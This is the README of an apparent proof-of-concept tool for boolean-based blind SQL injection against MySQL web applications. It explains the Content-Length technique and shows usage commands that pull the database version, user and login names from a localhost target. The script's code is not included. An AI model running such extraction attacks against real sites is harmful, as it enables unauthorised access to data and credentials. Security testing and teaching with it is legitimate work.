# mysql_bb
Boolean-based blind SQL injection exploit for MySQL.

This script attempts to retrieve result of given SQL query by making boolean-based blind injection into supplied HTTP GET URI. Basic concept is the assumption that True and False answers has different Content-Length header and True>False.
## Usage example
Be sure you have no errors in SQL syntax, otherwise it may lead to false negative results. No ending semicolon is needed since given query will be inserted as subquery into substring() MySQL function.
```bash
python3 mysql_bb_poc.py "http://localhost?param=" "select version()"
5.5.47-0+deb8u1
(+) done!
python3 mysql_bb_poc.py "http://localhost?param=" "select user()"
root@localhost
(+) done!
python3 mysql_bb_poc.py "http://localhost?param=" "select login from users"
admin
(+) done!
```
